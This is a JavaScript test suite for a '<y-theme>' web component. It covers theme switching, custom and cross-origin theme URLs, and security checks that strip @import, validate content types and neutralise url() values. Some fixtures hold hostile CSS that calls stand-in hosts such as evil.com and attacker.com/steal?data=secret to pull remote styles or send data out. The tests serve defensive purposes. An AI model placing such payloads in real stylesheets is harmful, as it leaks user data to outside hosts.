import { fixture, html, expect, waitUntil } from "@open-wc/testing";
import "./y-theme.js";

/** Helper to build a minimal Response-like object for fetch stubs. */
function cssResponse(body, contentType = "text/css") {
    return {
        headers: new Headers({ "content-type": contentType }),
        text: async () => body,
    };
}

describe("<y-theme>", () => {
    it("renders slotted content", async () => {
        const el = await fixture(
            html`<y-theme><div id="test-content">Hello</div></y-theme>`,
        );

        const slotted = el.querySelector("#test-content");
        expect(slotted).to.exist;
        expect(slotted.textContent).to.equal("Hello");
    });

    it("applies base variables from the bundled variables sheet", async () => {
        const el = await fixture(html`<y-theme></y-theme>`);

        // --spacing-medium is a concrete value defined in variables.css
        const spacing = el.style.getPropertyValue("--spacing-medium");
        expect(spacing.trim()).to.equal("8px");
    });

    it("defaults to blue-light theme when no attributes are set", async () => {
        const el = await fixture(html`<y-theme></y-theme>`);

        // --font-family-body is set to "Lexend", sans-serif in all theme files
        const font = el.style.getPropertyValue("--font-family-body");
        expect(font.trim()).to.not.be.empty;

        // blue-light sets --base-background-app to a neutral-light variable
        const bg = el.style.getPropertyValue("--base-background-app");
        expect(bg).to.include("light");
    });

    it("applies dark mode when theme='blue-dark'", async () => {
        const el = await fixture(html`<y-theme theme="blue-dark"></y-theme>`);

        // blue-dark sets --base-background-app to a neutral-dark variable
        const bg = el.style.getPropertyValue("--base-background-app");
        expect(bg).to.include("dark");
    });

    it("updates applied variables when theme attribute changes", async () => {
        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);

        const lightBg = el.style.getPropertyValue("--base-background-app");
        expect(lightBg).to.include("light");

        el.setAttribute("theme", "blue-dark");

        await waitUntil(() =>
            el.style.getPropertyValue("--base-background-app").includes("dark"),
        );

        const darkBg = el.style.getPropertyValue("--base-background-app");
        expect(darkBg).to.include("dark");
    });

    it("updates applied variables when switching theme families", async () => {
        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);

        // Both blue-light and orange-light define --primary-content--.
        // Verify the property is still populated after switching theme.
        el.setAttribute("theme", "orange-light");

        const primaryContent = el.style.getPropertyValue("--primary-content--");
        expect(primaryContent.trim()).to.not.be.empty;
    });

    it("injects two <style> elements into shadow DOM (variables + theme)", async () => {
        const el = await fixture(html`<y-theme theme="blue-light"></y-theme>`);

        const styles = el.shadowRoot.querySelectorAll("style");
        expect(styles.length).to.equal(2);
    });

    it("two side-by-side themes do not share inline style variables", async () => {
        const wrapper = await fixture(html`
            <div>
                <y-theme id="a" theme="blue-light"></y-theme>
                <y-theme id="b" theme="blue-dark"></y-theme>
            </div>
        `);

        const themeA = wrapper.querySelector("#a");
        const themeB = wrapper.querySelector("#b");

        const bgA = themeA.style.getPropertyValue("--base-background-app");
        const bgB = themeB.style.getPropertyValue("--base-background-app");

        expect(bgA).to.include("light");
        expect(bgB).to.include("dark");
        expect(bgA).to.not.equal(bgB);
    });

    it("nested themes apply their own variables independently", async () => {
        const outer = await fixture(html`
            <y-theme id="outer" theme="blue-light">
                <y-theme id="inner" theme="blue-dark"></y-theme>
            </y-theme>
        `);

        const inner = outer.querySelector("#inner");

        const outerBg = outer.style.getPropertyValue("--base-background-app");
        const innerBg = inner.style.getPropertyValue("--base-background-app");

        expect(outerBg).to.include("light");
        expect(innerBg).to.include("dark");
        expect(outerBg).to.not.equal(innerBg);
    });

    describe("custom theme paths", () => {
        let originalFetch;

        beforeEach(() => {
            originalFetch = window.fetch;
            window.fetch = async (url) => {
                const str = url.toString();
                if (str.includes("custom.css"))
                    return cssResponse(`:root { --custom-var: hotpink; }`);
                if (str.includes("first.css"))
                    return cssResponse(`:root { --theme-color: blue; }`);
                if (str.includes("second.css"))
                    return cssResponse(`:root { --theme-color: green; }`);
                if (str.includes("override.css"))
                    return cssResponse(`:root { --override-var: purple; }`);
                return originalFetch(url);
            };
        });

        afterEach(() => {
            window.fetch = originalFetch;
        });

        it("loads and applies CSS from a custom theme URL", async () => {
            const el = await fixture(
                html`<y-theme theme="custom.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--custom-var") === "hotpink",
            );

            expect(el.style.getPropertyValue("--custom-var")).to.equal(
                "hotpink",
            );
        });

        it("still applies base variables when using a custom theme", async () => {
            const el = await fixture(
                html`<y-theme theme="custom.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--custom-var") === "hotpink",
            );

            // variables.css is always bundled regardless of theme
            expect(
                el.style.getPropertyValue("--spacing-medium").trim(),
            ).to.equal("8px");
        });

        it("updates when theme attribute changes from one URL to another", async () => {
            const el = await fixture(
                html`<y-theme theme="first.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--theme-color") === "blue",
            );

            el.setAttribute("theme", "second.css");

            await waitUntil(
                () => el.style.getPropertyValue("--theme-color") === "green",
            );

            expect(el.style.getPropertyValue("--theme-color")).to.equal(
                "green",
            );
        });

        it("switches from a custom theme back to a built-in theme", async () => {
            const el = await fixture(
                html`<y-theme theme="custom.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--custom-var") === "hotpink",
            );

            el.setAttribute("theme", "blue-dark");

            await waitUntil(() =>
                el.style
                    .getPropertyValue("--base-background-app")
                    .includes("dark"),
            );

            expect(
                el.style.getPropertyValue("--base-background-app"),
            ).to.include("dark");
        });

        it("degrades gracefully when the theme fetch fails", async () => {
            window.fetch = async () => {
                throw new Error("Network error");
            };

            const el = await fixture(
                html`<y-theme theme="missing.css"></y-theme>`,
            );

            // Give the async _applyTheme a moment to settle after the error
            await waitUntil(
                () => el.shadowRoot.querySelectorAll("style").length >= 1,
            );

            // Base variables are still applied even though the theme failed
            expect(
                el.style.getPropertyValue("--spacing-medium").trim(),
            ).to.equal("8px");
            // Only one <style> tag (variables only, no theme)
            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
        });

        it("blocks a cross-origin theme URL and returns empty CSS when cross-origin attribute is absent", async () => {
            // A URL with a different origin will be blocked without cross-origin attr
            const el = await fixture(
                html`<y-theme
                    theme="https://evil.example.com/theme.css"
                ></y-theme>`,
            );

            // Wait for _applyTheme to settle
            await waitUntil(
                () => el.shadowRoot.querySelectorAll("style").length >= 1,
            );

            // Only the base style should be present (no theme CSS loaded)
            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
        });

        it("allows a cross-origin theme URL when the cross-origin attribute is present", async () => {
            // Stub fetch to return a known cross-origin CSS payload
            window.fetch = async () => cssResponse(`:root { --xo-var: lime; }`);

            const el = await fixture(
                html`<y-theme
                    cross-origin
                    theme="https://other.example.com/theme.css"
                ></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--xo-var") === "lime",
            );

            expect(el.style.getPropertyValue("--xo-var")).to.equal("lime");
        });
    });

    describe("crossOrigin and theme property setters", () => {
        it("crossOrigin setter adds cross-origin attribute when set to true", async () => {
            const el = await fixture(html`<y-theme></y-theme>`);
            el.crossOrigin = true;
            expect(el.hasAttribute("cross-origin")).to.be.true;
        });

        it("crossOrigin setter removes cross-origin attribute when set to false", async () => {
            const el = await fixture(html`<y-theme cross-origin></y-theme>`);
            el.crossOrigin = false;
            expect(el.hasAttribute("cross-origin")).to.be.false;
        });

        it("theme setter updates the theme attribute", async () => {
            const el = await fixture(
                html`<y-theme theme="blue-light"></y-theme>`,
            );
            el.theme = "blue-dark";
            expect(el.getAttribute("theme")).to.equal("blue-dark");
        });

        it("theme getter returns 'blue-light' when no attribute is set", async () => {
            const el = await fixture(html`<y-theme></y-theme>`);
            el.removeAttribute("theme");
            expect(el.theme).to.equal("blue-light");
        });
    });

    describe("security: @import stripping", () => {
        let originalFetch;

        beforeEach(() => {
            originalFetch = window.fetch;
        });

        afterEach(() => {
            window.fetch = originalFetch;
        });

        it("strips @import rules from fetched CSS", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css"]]),
                text: async () =>
                    `@import url('https://evil.com/malicious.css');\n:root { --safe-var: green; }`,
            });

            const el = await fixture(
                html`<y-theme theme="themed.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--safe-var") === "green",
            );

            // The safe variable should be applied
            expect(el.style.getPropertyValue("--safe-var")).to.equal("green");

            // The shadow DOM style should not contain @import
            const styles = el.shadowRoot.querySelectorAll("style");
            const themeStyle = styles[styles.length - 2]; // theme style is before <slot>
            expect(themeStyle.textContent).to.not.include("@import");
        });

        it("strips multiple @import rules from fetched CSS", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css"]]),
                text: async () =>
                    `@import url('https://evil.com/a.css');\n@import 'https://evil.com/b.css';\n:root { --multi-var: red; }`,
            });

            const el = await fixture(
                html`<y-theme theme="multi-import.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--multi-var") === "red",
            );

            const styles = el.shadowRoot.querySelectorAll("style");
            const themeStyle = styles[styles.length - 2];
            expect(themeStyle.textContent).to.not.include("@import");
        });

        it("does not strip @import from built-in themes (trusted)", async () => {
            // Built-in themes bypass _resolveThemeCSS fetch path entirely,
            // so they are considered trusted. Just verify they still work.
            const el = await fixture(
                html`<y-theme theme="blue-light"></y-theme>`,
            );

            const bg = el.style.getPropertyValue("--base-background-app");
            expect(bg).to.include("light");
        });
    });

    describe("security: content-type validation", () => {
        let originalFetch;

        beforeEach(() => {
            originalFetch = window.fetch;
        });

        afterEach(() => {
            window.fetch = originalFetch;
        });

        it("blocks response with application/json content-type", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "application/json"]]),
                text: async () => `{"malicious": true}`,
            });

            const el = await fixture(html`<y-theme theme="bad.css"></y-theme>`);

            await waitUntil(
                () => el.shadowRoot.querySelectorAll("style").length >= 1,
            );

            // Only base style, no theme style
            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
        });

        it("blocks response with text/html content-type", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/html"]]),
                text: async () => `<html></html>`,
            });

            const el = await fixture(html`<y-theme theme="bad.css"></y-theme>`);

            await waitUntil(
                () => el.shadowRoot.querySelectorAll("style").length >= 1,
            );

            expect(el.shadowRoot.querySelectorAll("style").length).to.equal(1);
        });

        it("allows response with text/css content-type", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css; charset=utf-8"]]),
                text: async () => `:root { --ct-var: blue; }`,
            });

            const el = await fixture(
                html`<y-theme theme="good.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--ct-var") === "blue",
            );

            expect(el.style.getPropertyValue("--ct-var")).to.equal("blue");
        });

        it("allows response with text/plain content-type", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/plain"]]),
                text: async () => `:root { --tp-var: red; }`,
            });

            const el = await fixture(
                html`<y-theme theme="plain.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--tp-var") === "red",
            );

            expect(el.style.getPropertyValue("--tp-var")).to.equal("red");
        });

        it("allows response with missing content-type header", async () => {
            window.fetch = async () => ({
                headers: new Map(),
                text: async () => `:root { --no-ct: yes; }`,
            });

            const el = await fixture(
                html`<y-theme theme="no-ct.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--no-ct") === "yes",
            );

            expect(el.style.getPropertyValue("--no-ct")).to.equal("yes");
        });
    });

    describe("security: url() sanitization in custom properties", () => {
        let originalFetch;

        beforeEach(() => {
            originalFetch = window.fetch;
        });

        afterEach(() => {
            window.fetch = originalFetch;
        });

        it("replaces url() values in custom properties with 'none'", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css"]]),
                text: async () =>
                    `:root { --bg-image: url('https://attacker.com/steal?data=secret'); }`,
            });

            const el = await fixture(
                html`<y-theme theme="exfil.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--bg-image") === "none",
            );

            expect(el.style.getPropertyValue("--bg-image")).to.equal("none");
        });

        it("replaces url() in compound values without breaking the rest", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css"]]),
                text: async () =>
                    `:root { --bg: url(https://evil.com/img.png) no-repeat center; }`,
            });

            const el = await fixture(
                html`<y-theme theme="compound.css"></y-theme>`,
            );

            await waitUntil(() =>
                el.style.getPropertyValue("--bg").includes("none"),
            );

            const bg = el.style.getPropertyValue("--bg");
            expect(bg).to.include("none");
            expect(bg).to.include("no-repeat");
            expect(bg).to.not.include("evil.com");
        });

        it("does not alter safe values without url()", async () => {
            window.fetch = async () => ({
                headers: new Map([["content-type", "text/css"]]),
                text: async () => `:root { --safe-color: hotpink; }`,
            });

            const el = await fixture(
                html`<y-theme theme="safe.css"></y-theme>`,
            );

            await waitUntil(
                () => el.style.getPropertyValue("--safe-color") === "hotpink",
            );

            expect(el.style.getPropertyValue("--safe-color")).to.equal(
                "hotpink",
            );
        });
    });

    describe("clearThemeProperties", () => {
        it("removes all inline CSS custom properties previously applied", async () => {
            const el = await fixture(
                html`<y-theme theme="blue-light"></y-theme>`,
            );

            // Variables should have been applied by connectedCallback
            expect(
                el.style.getPropertyValue("--spacing-medium").trim(),
            ).to.equal("8px");

            el.clearThemeProperties();

            // After clearing, the property should no longer be set inline
            expect(el.style.getPropertyValue("--spacing-medium")).to.equal("");
        });

        it("resets the _themeProps array to empty after clearing", async () => {
            const el = await fixture(
                html`<y-theme theme="blue-light"></y-theme>`,
            );

            el.clearThemeProperties();

            expect(el._themeProps).to.deep.equal([]);
        });

        it("does not throw when called before any theme has been applied", async () => {
            const el = await fixture(html`<y-theme></y-theme>`);
            // Remove _themeProps to simulate a fresh element with no prior _applyTheme
            el._themeProps = undefined;
            expect(() => el.clearThemeProperties()).to.not.throw();
        });
    });
});
